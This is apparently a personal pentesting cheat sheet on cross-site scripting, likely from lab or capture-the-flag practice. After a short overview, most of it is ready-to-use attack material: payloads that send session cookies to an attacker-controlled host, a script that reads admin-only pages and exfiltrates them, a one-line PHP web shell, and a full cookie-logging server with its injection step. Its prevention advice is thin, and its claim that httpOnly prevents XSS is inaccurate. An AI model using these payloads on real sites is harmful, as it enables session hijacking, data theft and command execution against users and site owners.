# XSS - Cross Site Scripting

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page

## Description

Cross-Site Scripting (XSS) attacks occur when:

Data enters a Web application through an untrusted source, most frequently a web request.
The data is included in dynamic content that is sent to a web user without being validated for malicious content.

## Prevention

If the http header "httpOnly" is set to True, this prevents xss

### Cross-Origin-Opener-Policy:

If the http Header Cross-Origin-Opener-Policy is : same origin we cannot use xss payloads with fetch.
But we can try this payload

```javascript
<script>img=new Image();img.src="http://[myip]:[myport]/?img="+btoa(document.cookie);</script>
```

When we receive the cookie decode it

```shell
echo -n [cookie] | base64 -d
```

## Common Payloads

Steal cookies

	<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
	<img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
	"><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
	'><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
	<script>document.location='http://<YOUR_SERVER_IP>/?cookie='+document.cookie;</script>

If there is no cookie, e can also try to access pages the only the admin can have access, by doing:

	<script>
	fetch("http://page_that_only_admin_has_access_to")
	.then(response => response.text()) // Convert the response to text
	.then(data => {
		fetch("http://our_server_ip/?data=" + encodeURIComponent(data)); // Exfiltrate data
	})
	.catch(error => console.error("Error fetching the messages:", error));
	</script>

This fetches the page that onyl the admin has access to, converts it to text, uri encodes it, and then sends the data back to us.

## php payloads

	if isset($_REQUEST['cmd']){
		system($_REQUEST['cmd']);
	}
	then we pass the cmd arg in the request:
	<url>?cmd=whoami


## With files

Create a index.php with:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Create a script.js with:

```javascript
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```

Start a php webserver:

```shell
sudo php -S 0.0.0.0:9200
```

Finally inject the XSS:

```html
"><script src=http://10.10.14.15:9200/script.js></script>
```


## Tips

If the username might be seen by an admin account, try to register a username as a xss payload


## Relevant Information

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

https://owasp.org/www-community/attacks/xss/

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting